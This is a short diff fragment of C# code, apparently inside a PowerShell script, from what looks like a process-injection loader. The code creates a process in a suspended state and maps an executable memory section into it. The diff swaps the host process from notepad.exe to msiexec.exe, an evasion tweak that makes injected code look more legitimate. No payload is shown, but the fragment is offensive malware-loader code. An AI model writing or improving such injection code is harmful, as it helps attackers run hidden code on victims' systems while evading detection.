@@ -263,7 +263,7 @@ $XMLHEAD += @'
 					STARTUPINFO si = new STARTUPINFO();
 					PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 					PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
-					bool res = CreateProcess(null, "C:\\Windows\\System32\\notepad.exe", IntPtr.Zero,
+					bool res = CreateProcess(null, "C:\\Windows\\System32\\msiexec.exe", IntPtr.Zero,
 						IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
 					// create section
 					ZwCreateSection(ref section_, 0x10000000, (IntPtr)0, ref liVal, 0x40 , 0x08000000, (IntPtr)0);
